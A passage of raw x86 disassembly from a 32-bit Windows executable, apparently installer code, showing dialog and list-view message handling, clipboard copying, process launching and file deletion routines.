  405020:	e8 30 f0 ff ff       	call   0x404055
  405025:	33 c0                	xor    %eax,%eax
  405027:	eb 62                	jmp    0x40508b
  405029:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  40502f:	75 20                	jne    0x405051
  405031:	ff 75 08             	push   0x8(%ebp)
  405034:	ff 15 b8 71 40 00    	call   *0x4071b8
  40503a:	85 c0                	test   %eax,%eax
  40503c:	74 36                	je     0x405074
  40503e:	6a 01                	push   $0x1
  405040:	ff 75 08             	push   0x8(%ebp)
  405043:	e8 14 f9 ff ff       	call   0x40495c
  405048:	8b f8                	mov    %eax,%edi
  40504a:	bb 19 04 00 00       	mov    $0x419,%ebx
  40504f:	eb 03                	jmp    0x405054
  405051:	8b 7d 14             	mov    0x14(%ebp),%edi
  405054:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  40505a:	75 1b                	jne    0x405077
  40505c:	39 3d f4 fc 41 00    	cmp    %edi,0x41fcf4
  405062:	74 13                	je     0x405077
  405064:	57                   	push   %edi
  405065:	6a 06                	push   $0x6
  405067:	89 3d f4 fc 41 00    	mov    %edi,0x41fcf4
  40506d:	e8 6a f9 ff ff       	call   0x4049dc
  405072:	eb 03                	jmp    0x405077
  405074:	8b 7d 14             	mov    0x14(%ebp),%edi
  405077:	57                   	push   %edi
  405078:	ff 75 10             	push   0x10(%ebp)
  40507b:	53                   	push   %ebx
  40507c:	ff 75 08             	push   0x8(%ebp)
  40507f:	ff 35 fc fc 41 00    	push   0x41fcfc
  405085:	ff 15 b4 71 40 00    	call   *0x4071b4
  40508b:	5f                   	pop    %edi
  40508c:	5b                   	pop    %ebx
  40508d:	5d                   	pop    %ebp
  40508e:	c2 10 00             	ret    $0x10
  405091:	55                   	push   %ebp
  405092:	8b ec                	mov    %esp,%ebp
  405094:	83 ec 30             	sub    $0x30,%esp
  405097:	a1 e4 2e 42 00       	mov    0x422ee4,%eax
  40509c:	53                   	push   %ebx
  40509d:	33 db                	xor    %ebx,%ebx
  40509f:	56                   	push   %esi
  4050a0:	3b c3                	cmp    %ebx,%eax
  4050a2:	57                   	push   %edi
  4050a3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4050a6:	0f 84 b0 00 00 00    	je     0x40515c
  4050ac:	a1 d4 37 42 00       	mov    0x4237d4,%eax
  4050b1:	be e8 f4 41 00       	mov    $0x41f4e8,%esi
  4050b6:	8b f8                	mov    %eax,%edi
  4050b8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4050bb:	83 e7 01             	and    $0x1,%edi
  4050be:	75 09                	jne    0x4050c9
  4050c0:	ff 75 08             	push   0x8(%ebp)
  4050c3:	56                   	push   %esi
  4050c4:	e8 c3 0e 00 00       	call   0x405f8c
  4050c9:	56                   	push   %esi
  4050ca:	e8 b1 0e 00 00       	call   0x405f80
  4050cf:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  4050d2:	89 45 08             	mov    %eax,0x8(%ebp)
  4050d5:	74 1b                	je     0x4050f2
  4050d7:	ff 75 0c             	push   0xc(%ebp)
  4050da:	e8 a1 0e 00 00       	call   0x405f80
  4050df:	03 45 08             	add    0x8(%ebp),%eax
  4050e2:	3d 00 08 00 00       	cmp    $0x800,%eax
  4050e7:	73 73                	jae    0x40515c
  4050e9:	ff 75 0c             	push   0xc(%ebp)
  4050ec:	56                   	push   %esi
  4050ed:	e8 94 0e 00 00       	call   0x405f86
  4050f2:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  4050f6:	75 0d                	jne    0x405105
  4050f8:	56                   	push   %esi
  4050f9:	ff 35 c8 2e 42 00    	push   0x422ec8
  4050ff:	ff 15 7c 72 40 00    	call   *0x40727c
  405105:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  405109:	75 44                	jne    0x40514f
  40510b:	53                   	push   %ebx
  40510c:	53                   	push   %ebx
  40510d:	68 04 10 00 00       	push   $0x1004
  405112:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  405115:	ff 75 fc             	push   -0x4(%ebp)
  405118:	8b 35 00 72 40 00    	mov    0x407200,%esi
  40511e:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  405125:	ff d6                	call   *%esi
  405127:	2b c7                	sub    %edi,%eax
  405129:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  40512c:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40512f:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405132:	50                   	push   %eax
  405133:	b8 07 10 00 00       	mov    $0x1007,%eax
  405138:	2b c7                	sub    %edi,%eax
  40513a:	53                   	push   %ebx
  40513b:	50                   	push   %eax
  40513c:	ff 75 fc             	push   -0x4(%ebp)
  40513f:	ff d6                	call   *%esi
  405141:	53                   	push   %ebx
  405142:	ff 75 d4             	push   -0x2c(%ebp)
  405145:	68 13 10 00 00       	push   $0x1013
  40514a:	ff 75 fc             	push   -0x4(%ebp)
  40514d:	ff d6                	call   *%esi
  40514f:	3b fb                	cmp    %ebx,%edi
  405151:	74 09                	je     0x40515c
  405153:	8b 45 08             	mov    0x8(%ebp),%eax
  405156:	88 98 e8 f4 41 00    	mov    %bl,0x41f4e8(%eax)
  40515c:	5f                   	pop    %edi
  40515d:	5e                   	pop    %esi
  40515e:	5b                   	pop    %ebx
  40515f:	c9                   	leave
  405160:	c2 08 00             	ret    $0x8
  405163:	56                   	push   %esi
  405164:	8b 35 48 37 42 00    	mov    0x423748,%esi
  40516a:	57                   	push   %edi
  40516b:	8b 3d 4c 37 42 00    	mov    0x42374c,%edi
  405171:	6a 00                	push   $0x0
  405173:	ff 15 88 72 40 00    	call   *0x407288
  405179:	09 05 d8 37 42 00    	or     %eax,0x4237d8
  40517f:	6a 00                	push   $0x0
  405181:	e8 cf ee ff ff       	call   0x404055
  405186:	85 ff                	test   %edi,%edi
  405188:	74 2b                	je     0x4051b5
  40518a:	83 c6 0c             	add    $0xc,%esi
  40518d:	4f                   	dec    %edi
  40518e:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405192:	74 0f                	je     0x4051a3
  405194:	ff 74 24 0c          	push   0xc(%esp)
  405198:	ff 36                	push   (%esi)
  40519a:	e8 ea c1 ff ff       	call   0x401389
  40519f:	85 c0                	test   %eax,%eax
  4051a1:	75 0c                	jne    0x4051af
  4051a3:	81 c6 18 04 00 00    	add    $0x418,%esi
  4051a9:	85 ff                	test   %edi,%edi
  4051ab:	75 e0                	jne    0x40518d
  4051ad:	eb 06                	jmp    0x4051b5
  4051af:	ff 05 ac 37 42 00    	incl   0x4237ac
  4051b5:	68 04 04 00 00       	push   $0x404
  4051ba:	e8 96 ee ff ff       	call   0x404055
  4051bf:	ff 15 84 72 40 00    	call   *0x407284
  4051c5:	a1 ac 37 42 00       	mov    0x4237ac,%eax
  4051ca:	5f                   	pop    %edi
  4051cb:	5e                   	pop    %esi
  4051cc:	c2 04 00             	ret    $0x4
  4051cf:	55                   	push   %ebp
  4051d0:	8b ec                	mov    %esp,%ebp
  4051d2:	83 ec 3c             	sub    $0x3c,%esp
  4051d5:	a1 e4 2e 42 00       	mov    0x422ee4,%eax
  4051da:	53                   	push   %ebx
  4051db:	56                   	push   %esi
  4051dc:	57                   	push   %edi
  4051dd:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4051e0:	33 db                	xor    %ebx,%ebx
  4051e2:	81 ff 10 01 00 00    	cmp    $0x110,%edi
  4051e8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4051eb:	0f 85 89 01 00 00    	jne    0x40537a
  4051f1:	83 4d d4 ff          	orl    $0xffffffff,-0x2c(%ebp)
  4051f5:	83 4d e0 ff          	orl    $0xffffffff,-0x20(%ebp)
  4051f9:	6a 02                	push   $0x2
  4051fb:	33 c0                	xor    %eax,%eax
  4051fd:	5e                   	pop    %esi
  4051fe:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  405201:	89 75 cc             	mov    %esi,-0x34(%ebp)
  405204:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  405207:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  40520a:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  40520d:	ab                   	stos   %eax,%es:(%edi)
  40520e:	ab                   	stos   %eax,%es:(%edi)
  40520f:	a1 14 37 42 00       	mov    0x423714,%eax
  405214:	8b 3d 44 72 40 00    	mov    0x407244,%edi
  40521a:	68 03 04 00 00       	push   $0x403
  40521f:	8b 48 5c             	mov    0x5c(%eax),%ecx
  405222:	8b 40 60             	mov    0x60(%eax),%eax
  405225:	ff 75 08             	push   0x8(%ebp)
  405228:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40522b:	89 45 0c             	mov    %eax,0xc(%ebp)
  40522e:	ff d7                	call   *%edi
  405230:	68 ee 03 00 00       	push   $0x3ee
  405235:	a3 d0 2e 42 00       	mov    %eax,0x422ed0
  40523a:	ff 75 08             	push   0x8(%ebp)
  40523d:	ff d7                	call   *%edi
  40523f:	68 f8 03 00 00       	push   $0x3f8
  405244:	a3 c8 2e 42 00       	mov    %eax,0x422ec8
  405249:	ff 75 08             	push   0x8(%ebp)
  40524c:	ff d7                	call   *%edi
  40524e:	ff 35 d0 2e 42 00    	push   0x422ed0
  405254:	a3 e4 2e 42 00       	mov    %eax,0x422ee4
  405259:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40525c:	e8 dd ed ff ff       	call   0x40403e
  405261:	6a 04                	push   $0x4
  405263:	e8 c7 f6 ff ff       	call   0x40492f
  405268:	a3 d4 2e 42 00       	mov    %eax,0x422ed4
  40526d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405270:	50                   	push   %eax
  405271:	89 1d ec 2e 42 00    	mov    %ebx,0x422eec
  405277:	ff 75 fc             	push   -0x4(%ebp)
  40527a:	ff 15 0c 72 40 00    	call   *0x40720c
  405280:	56                   	push   %esi
  405281:	ff 15 d8 71 40 00    	call   *0x4071d8
  405287:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40528a:	8b 35 00 72 40 00    	mov    0x407200,%esi
  405290:	2b c8                	sub    %eax,%ecx
  405292:	8d 45 cc             	lea    -0x34(%ebp),%eax
  405295:	50                   	push   %eax
  405296:	53                   	push   %ebx
  405297:	68 1b 10 00 00       	push   $0x101b
  40529c:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40529f:	ff 75 fc             	push   -0x4(%ebp)
  4052a2:	ff d6                	call   *%esi
  4052a4:	b8 00 40 00 00       	mov    $0x4000,%eax
  4052a9:	50                   	push   %eax
  4052aa:	50                   	push   %eax
  4052ab:	68 36 10 00 00       	push   $0x1036
  4052b0:	ff 75 fc             	push   -0x4(%ebp)
  4052b3:	ff d6                	call   *%esi
  4052b5:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  4052b8:	7c 1c                	jl     0x4052d6
  4052ba:	ff 75 10             	push   0x10(%ebp)
  4052bd:	53                   	push   %ebx
  4052be:	68 01 10 00 00       	push   $0x1001
  4052c3:	ff 75 fc             	push   -0x4(%ebp)
  4052c6:	ff d6                	call   *%esi
  4052c8:	ff 75 10             	push   0x10(%ebp)
  4052cb:	53                   	push   %ebx
  4052cc:	68 26 10 00 00       	push   $0x1026
  4052d1:	ff 75 fc             	push   -0x4(%ebp)
  4052d4:	ff d6                	call   *%esi
  4052d6:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  4052d9:	7c 0e                	jl     0x4052e9
  4052db:	ff 75 0c             	push   0xc(%ebp)
  4052de:	53                   	push   %ebx
  4052df:	68 24 10 00 00       	push   $0x1024
  4052e4:	ff 75 fc             	push   -0x4(%ebp)
  4052e7:	ff d6                	call   *%esi
  4052e9:	8b 45 14             	mov    0x14(%ebp),%eax
  4052ec:	ff 70 30             	push   0x30(%eax)
  4052ef:	6a 1b                	push   $0x1b
  4052f1:	ff 75 08             	push   0x8(%ebp)
  4052f4:	e8 10 ed ff ff       	call   0x404009
  4052f9:	f6 05 1c 37 42 00 03 	testb  $0x3,0x42371c
  405300:	74 34                	je     0x405336
  405302:	53                   	push   %ebx
  405303:	ff 35 d0 2e 42 00    	push   0x422ed0
  405309:	ff 15 78 72 40 00    	call   *0x407278
  40530f:	f6 05 1c 37 42 00 02 	testb  $0x2,0x42371c
  405316:	75 0d                	jne    0x405325
  405318:	6a 08                	push   $0x8
  40531a:	ff 75 fc             	push   -0x4(%ebp)
  40531d:	ff 15 78 72 40 00    	call   *0x407278
  405323:	eb 06                	jmp    0x40532b
  405325:	89 1d d0 2e 42 00    	mov    %ebx,0x422ed0
  40532b:	ff 35 c8 2e 42 00    	push   0x422ec8
  405331:	e8 08 ed ff ff       	call   0x40403e
  405336:	68 ec 03 00 00       	push   $0x3ec
  40533b:	ff 75 08             	push   0x8(%ebp)
  40533e:	ff d7                	call   *%edi
  405340:	68 00 00 30 75       	push   $0x75300000
  405345:	8b f8                	mov    %eax,%edi
  405347:	53                   	push   %ebx
  405348:	68 01 04 00 00       	push   $0x401
  40534d:	57                   	push   %edi
  40534e:	ff d6                	call   *%esi
  405350:	f6 05 1c 37 42 00 04 	testb  $0x4,0x42371c
  405357:	0f 84 f3 01 00 00    	je     0x405550
  40535d:	ff 75 0c             	push   0xc(%ebp)
  405360:	53                   	push   %ebx
  405361:	68 09 04 00 00       	push   $0x409
  405366:	57                   	push   %edi
  405367:	ff d6                	call   *%esi
  405369:	ff 75 10             	push   0x10(%ebp)
  40536c:	53                   	push   %ebx
  40536d:	68 01 20 00 00       	push   $0x2001
  405372:	57                   	push   %edi
  405373:	ff d6                	call   *%esi
  405375:	e9 d6 01 00 00       	jmp    0x405550
  40537a:	81 ff 05 04 00 00    	cmp    $0x405,%edi
  405380:	75 28                	jne    0x4053aa
  405382:	8d 45 0c             	lea    0xc(%ebp),%eax
  405385:	50                   	push   %eax
  405386:	53                   	push   %ebx
  405387:	68 ec 03 00 00       	push   $0x3ec
  40538c:	ff 75 08             	push   0x8(%ebp)
  40538f:	ff 15 44 72 40 00    	call   *0x407244
  405395:	50                   	push   %eax
  405396:	68 63 51 40 00       	push   $0x405163
  40539b:	53                   	push   %ebx
  40539c:	53                   	push   %ebx
  40539d:	ff 15 1c 71 40 00    	call   *0x40711c
  4053a3:	50                   	push   %eax
  4053a4:	ff 15 14 71 40 00    	call   *0x407114
  4053aa:	8b 35 78 72 40 00    	mov    0x407278,%esi
  4053b0:	81 ff 11 01 00 00    	cmp    $0x111,%edi
  4053b6:	75 20                	jne    0x4053d8
  4053b8:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  4053be:	75 39                	jne    0x4053f9
  4053c0:	53                   	push   %ebx
  4053c1:	ff 35 d0 2e 42 00    	push   0x422ed0
  4053c7:	ff d6                	call   *%esi
  4053c9:	6a 08                	push   $0x8
  4053cb:	ff 75 fc             	push   -0x4(%ebp)
  4053ce:	ff d6                	call   *%esi
  4053d0:	ff 75 fc             	push   -0x4(%ebp)
  4053d3:	e8 66 ec ff ff       	call   0x40403e
  4053d8:	81 ff 04 04 00 00    	cmp    $0x404,%edi
  4053de:	75 53                	jne    0x405433
  4053e0:	39 1d cc 2e 42 00    	cmp    %ebx,0x422ecc
  4053e6:	74 24                	je     0x40540c
  4053e8:	6a 78                	push   $0x78
  4053ea:	c7 05 d8 f0 41 00 02 	movl   $0x2,0x41f0d8
  4053f1:	00 00 00 
  4053f4:	e8 e9 eb ff ff       	call   0x403fe2
  4053f9:	ff 75 14             	push   0x14(%ebp)
  4053fc:	ff 75 10             	push   0x10(%ebp)
  4053ff:	57                   	push   %edi
  405400:	e8 6b ec ff ff       	call   0x404070
  405405:	5f                   	pop    %edi
  405406:	5e                   	pop    %esi
  405407:	5b                   	pop    %ebx
  405408:	c9                   	leave
  405409:	c2 10 00             	ret    $0x10
  40540c:	6a 08                	push   $0x8
  40540e:	ff 35 08 37 42 00    	push   0x423708
  405414:	ff d6                	call   *%esi
  405416:	39 1d ac 37 42 00    	cmp    %ebx,0x4237ac
  40541c:	75 0e                	jne    0x40542c
  40541e:	a1 e0 f4 41 00       	mov    0x41f4e0,%eax
  405423:	53                   	push   %ebx
  405424:	ff 70 34             	push   0x34(%eax)
  405427:	e8 65 fc ff ff       	call   0x405091
  40542c:	6a 01                	push   $0x1
  40542e:	e8 af eb ff ff       	call   0x403fe2
  405433:	83 ff 7b             	cmp    $0x7b,%edi
  405436:	75 c1                	jne    0x4053f9
  405438:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40543b:	39 45 10             	cmp    %eax,0x10(%ebp)
  40543e:	75 b9                	jne    0x4053f9
  405440:	53                   	push   %ebx
  405441:	53                   	push   %ebx
  405442:	68 04 10 00 00       	push   $0x1004
  405447:	50                   	push   %eax
  405448:	ff 15 00 72 40 00    	call   *0x407200
  40544e:	3b c3                	cmp    %ebx,%eax
  405450:	89 45 10             	mov    %eax,0x10(%ebp)
  405453:	0f 8e f7 00 00 00    	jle    0x405550
  405459:	ff 15 d4 71 40 00    	call   *0x4071d4
  40545f:	6a e1                	push   $0xffffffe1
  405461:	53                   	push   %ebx
  405462:	8b f0                	mov    %eax,%esi
  405464:	e8 23 0b 00 00       	call   0x405f8c
  405469:	50                   	push   %eax
  40546a:	6a 01                	push   $0x1
  40546c:	53                   	push   %ebx
  40546d:	56                   	push   %esi
  40546e:	ff 15 68 72 40 00    	call   *0x407268
  405474:	8b 4d 14             	mov    0x14(%ebp),%ecx
  405477:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  40547b:	c1 e9 10             	shr    $0x10,%ecx
  40547e:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405482:	0f bf c9             	movswl %cx,%ecx
  405485:	75 13                	jne    0x40549a
  405487:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40548a:	50                   	push   %eax
  40548b:	ff 75 fc             	push   -0x4(%ebp)
  40548e:	ff 15 cc 71 40 00    	call   *0x4071cc
  405494:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405497:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40549a:	53                   	push   %ebx
  40549b:	ff 75 08             	push   0x8(%ebp)
  40549e:	53                   	push   %ebx
  40549f:	51                   	push   %ecx
  4054a0:	50                   	push   %eax
  4054a1:	68 80 01 00 00       	push   $0x180
  4054a6:	56                   	push   %esi
  4054a7:	ff 15 64 72 40 00    	call   *0x407264
  4054ad:	83 f8 01             	cmp    $0x1,%eax
  4054b0:	0f 85 9a 00 00 00    	jne    0x405550
  4054b6:	8b 45 10             	mov    0x10(%ebp),%eax
  4054b9:	33 f6                	xor    %esi,%esi
  4054bb:	46                   	inc    %esi
  4054bc:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4054bf:	c7 45 d8 08 fd 41 00 	movl   $0x41fd08,-0x28(%ebp)
  4054c6:	c7 45 dc 00 10 00 00 	movl   $0x1000,-0x24(%ebp)
  4054cd:	89 45 08             	mov    %eax,0x8(%ebp)
  4054d0:	bf 2d 10 00 00       	mov    $0x102d,%edi
  4054d5:	ff 4d 08             	decl   0x8(%ebp)
  4054d8:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4054db:	50                   	push   %eax
  4054dc:	ff 75 08             	push   0x8(%ebp)
  4054df:	57                   	push   %edi
  4054e0:	ff 75 fc             	push   -0x4(%ebp)
  4054e3:	ff 15 00 72 40 00    	call   *0x407200
  4054e9:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4054ec:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  4054f0:	75 e3                	jne    0x4054d5
  4054f2:	53                   	push   %ebx
  4054f3:	ff 15 60 72 40 00    	call   *0x407260
  4054f9:	ff 15 c4 71 40 00    	call   *0x4071c4
  4054ff:	56                   	push   %esi
  405500:	6a 42                	push   $0x42
  405502:	ff 15 58 71 40 00    	call   *0x407158
  405508:	50                   	push   %eax
  405509:	89 45 08             	mov    %eax,0x8(%ebp)
  40550c:	ff 15 20 71 40 00    	call   *0x407120
  405512:	8b f0                	mov    %eax,%esi
  405514:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  405517:	89 75 d8             	mov    %esi,-0x28(%ebp)
  40551a:	50                   	push   %eax
  40551b:	53                   	push   %ebx
  40551c:	57                   	push   %edi
  40551d:	ff 75 fc             	push   -0x4(%ebp)
  405520:	ff 15 00 72 40 00    	call   *0x407200
  405526:	03 f0                	add    %eax,%esi
  405528:	c6 06 0d             	movb   $0xd,(%esi)
  40552b:	46                   	inc    %esi
  40552c:	c6 06 0a             	movb   $0xa,(%esi)
  40552f:	46                   	inc    %esi
  405530:	43                   	inc    %ebx
  405531:	3b 5d 10             	cmp    0x10(%ebp),%ebx
  405534:	7c de                	jl     0x405514
  405536:	ff 75 08             	push   0x8(%ebp)
  405539:	ff 15 ac 70 40 00    	call   *0x4070ac
  40553f:	ff 75 08             	push   0x8(%ebp)
  405542:	6a 01                	push   $0x1
  405544:	ff 15 c0 71 40 00    	call   *0x4071c0
  40554a:	ff 15 bc 71 40 00    	call   *0x4071bc
  405550:	33 c0                	xor    %eax,%eax
  405552:	e9 ae fe ff ff       	jmp    0x405405
  405557:	55                   	push   %ebp
  405558:	8b ec                	mov    %esp,%ebp
  40555a:	83 ec 20             	sub    $0x20,%esp
  40555d:	b8 7c 73 40 00       	mov    $0x40737c,%eax
  405562:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  405566:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405569:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40556c:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40556f:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  405573:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405577:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40557a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40557d:	56                   	push   %esi
  40557e:	50                   	push   %eax
  40557f:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  405583:	ff 75 08             	push   0x8(%ebp)
  405586:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  40558c:	c7 45 f0 6c 73 40 00 	movl   $0x40736c,-0x10(%ebp)
  405593:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  40559a:	ff 15 bc 70 40 00    	call   *0x4070bc
  4055a0:	85 c0                	test   %eax,%eax
  4055a2:	74 04                	je     0x4055a8
  4055a4:	33 c0                	xor    %eax,%eax
  4055a6:	eb 27                	jmp    0x4055cf
  4055a8:	8b 35 b8 70 40 00    	mov    0x4070b8,%esi
  4055ae:	ff d6                	call   *%esi
  4055b0:	3d b7 00 00 00       	cmp    $0xb7,%eax
  4055b5:	75 18                	jne    0x4055cf
  4055b7:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4055ba:	50                   	push   %eax
  4055bb:	68 07 00 00 80       	push   $0x80000007
  4055c0:	ff 75 08             	push   0x8(%ebp)
  4055c3:	ff 15 0c 70 40 00    	call   *0x40700c
  4055c9:	85 c0                	test   %eax,%eax
  4055cb:	75 d7                	jne    0x4055a4
  4055cd:	ff d6                	call   *%esi
  4055cf:	5e                   	pop    %esi
  4055d0:	c9                   	leave
  4055d1:	c2 04 00             	ret    $0x4
  4055d4:	6a 00                	push   $0x0
  4055d6:	ff 74 24 08          	push   0x8(%esp)
  4055da:	ff 15 bc 70 40 00    	call   *0x4070bc
  4055e0:	85 c0                	test   %eax,%eax
  4055e2:	74 04                	je     0x4055e8
  4055e4:	33 c0                	xor    %eax,%eax
  4055e6:	eb 06                	jmp    0x4055ee
  4055e8:	ff 15 b8 70 40 00    	call   *0x4070b8
  4055ee:	c2 04 00             	ret    $0x4
  4055f1:	6a 05                	push   $0x5
  4055f3:	e8 0a 0d 00 00       	call   0x406302
  4055f8:	85 c0                	test   %eax,%eax
  4055fa:	74 0a                	je     0x405606
  4055fc:	ff d0                	call   *%eax
  4055fe:	85 c0                	test   %eax,%eax
  405600:	74 04                	je     0x405606
  405602:	33 c0                	xor    %eax,%eax
  405604:	40                   	inc    %eax
  405605:	c3                   	ret
  405606:	33 c0                	xor    %eax,%eax
  405608:	c3                   	ret
  405609:	55                   	push   %ebp
  40560a:	8b ec                	mov    %esp,%ebp
  40560c:	83 ec 10             	sub    $0x10,%esp
  40560f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405612:	c7 05 10 15 42 00 44 	movl   $0x44,0x421510
  405619:	00 00 00 
  40561c:	50                   	push   %eax
  40561d:	33 c0                	xor    %eax,%eax
  40561f:	68 10 15 42 00       	push   $0x421510
  405624:	50                   	push   %eax
  405625:	50                   	push   %eax
  405626:	68 00 00 00 04       	push   $0x4000000
  40562b:	50                   	push   %eax
  40562c:	50                   	push   %eax
  40562d:	50                   	push   %eax
  40562e:	ff 75 08             	push   0x8(%ebp)
  405631:	50                   	push   %eax
  405632:	ff 15 c0 70 40 00    	call   *0x4070c0
  405638:	85 c0                	test   %eax,%eax
  40563a:	74 0c                	je     0x405648
  40563c:	ff 75 f4             	push   -0xc(%ebp)
  40563f:	ff 15 14 71 40 00    	call   *0x407114
  405645:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405648:	c9                   	leave
  405649:	c2 04 00             	ret    $0x4
  40564c:	8b 44 24 04          	mov    0x4(%esp),%eax
  405650:	50                   	push   %eax
  405651:	83 60 24 00          	andl   $0x0,0x24(%eax)
  405655:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  40565b:	ff 15 6c 71 40 00    	call   *0x40716c
  405661:	c2 04 00             	ret    $0x4
  405664:	ff 25 dc 71 40 00    	jmp    *0x4071dc
  40566a:	68 00 04 00 00       	push   $0x400
  40566f:	ff 74 24 0c          	push   0xc(%esp)
  405673:	ff 74 24 0c          	push   0xc(%esp)
  405677:	ff 35 d8 2e 42 00    	push   0x422ed8
  40567d:	ff 15 e0 71 40 00    	call   *0x4071e0
  405683:	c2 08 00             	ret    $0x8
  405686:	8b 44 24 08          	mov    0x8(%esp),%eax
  40568a:	8b c8                	mov    %eax,%ecx
  40568c:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405692:	83 3d c0 37 42 00 00 	cmpl   $0x0,0x4237c0
  405699:	74 05                	je     0x4056a0
  40569b:	c1 e8 15             	shr    $0x15,%eax
  40569e:	75 47                	jne    0x4056e7
  4056a0:	83 3d c8 37 42 00 00 	cmpl   $0x0,0x4237c8
  4056a7:	74 06                	je     0x4056af
  4056a9:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  4056af:	a1 08 37 42 00       	mov    0x423708,%eax
  4056b4:	68 18 92 40 00       	push   $0x409218
  4056b9:	a3 1c 92 40 00       	mov    %eax,0x40921c
  4056be:	a1 00 37 42 00       	mov    0x423700,%eax
  4056c3:	a3 20 92 40 00       	mov    %eax,0x409220
  4056c8:	8b 44 24 08          	mov    0x8(%esp),%eax
  4056cc:	a3 24 92 40 00       	mov    %eax,0x409224
  4056d1:	c7 05 28 92 40 00 00 	movl   $0x422f00,0x409228
  4056d8:	2f 42 00 
  4056db:	89 0d 2c 92 40 00    	mov    %ecx,0x40922c
  4056e1:	ff 15 e4 71 40 00    	call   *0x4071e4
  4056e7:	c2 08 00             	ret    $0x8
  4056ea:	56                   	push   %esi
  4056eb:	8b 74 24 08          	mov    0x8(%esp),%esi
  4056ef:	57                   	push   %edi
  4056f0:	56                   	push   %esi
  4056f1:	e8 e8 03 00 00       	call   0x405ade
  4056f6:	8b f8                	mov    %eax,%edi
  4056f8:	83 ff ff             	cmp    $0xffffffff,%edi
  4056fb:	74 2e                	je     0x40572b
  4056fd:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  405702:	56                   	push   %esi
  405703:	74 08                	je     0x40570d
  405705:	ff 15 c4 70 40 00    	call   *0x4070c4
  40570b:	eb 06                	jmp    0x405713
  40570d:	ff 15 30 71 40 00    	call   *0x407130
  405713:	85 c0                	test   %eax,%eax
  405715:	74 05                	je     0x40571c
  405717:	33 c0                	xor    %eax,%eax
  405719:	40                   	inc    %eax
  40571a:	eb 11                	jmp    0x40572d
  40571c:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  405721:	75 08                	jne    0x40572b
  405723:	57                   	push   %edi
  405724:	56                   	push   %esi
  405725:	ff 15 f8 70 40 00    	call   *0x4070f8
  40572b:	33 c0                	xor    %eax,%eax
  40572d:	5f                   	pop    %edi
  40572e:	5e                   	pop    %esi
  40572f:	c2 08 00             	ret    $0x8
  405732:	55                   	push   %ebp
  405733:	8b ec                	mov    %esp,%ebp
  405735:	81 ec 4c 01 00 00    	sub    $0x14c,%esp
  40573b:	53                   	push   %ebx
  40573c:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40573f:	56                   	push   %esi
  405740:	57                   	push   %edi
  405741:	8b 7d 08             	mov    0x8(%ebp),%edi
  405744:	8b c3                	mov    %ebx,%eax
  405746:	83 e0 04             	and    $0x4,%eax
  405749:	57                   	push   %edi
  40574a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40574d:	e8 9e 02 00 00       	call   0x4059f0
  405752:	f6 c3 08             	test   $0x8,%bl
  405755:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405758:	74 17                	je     0x405771
  40575a:	57                   	push   %edi
  40575b:	ff 15 30 71 40 00    	call   *0x407130
  405761:	f7 d8                	neg    %eax
  405763:	1b c0                	sbb    %eax,%eax
  405765:	40                   	inc    %eax
  405766:	01 05 a8 37 42 00    	add    %eax,0x4237a8
  40576c:	e9 8a 01 00 00       	jmp    0x4058fb
  405771:	89 5d 08             	mov    %ebx,0x8(%ebp)
  405774:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  405778:	74 11                	je     0x40578b
  40577a:	85 c0                	test   %eax,%eax
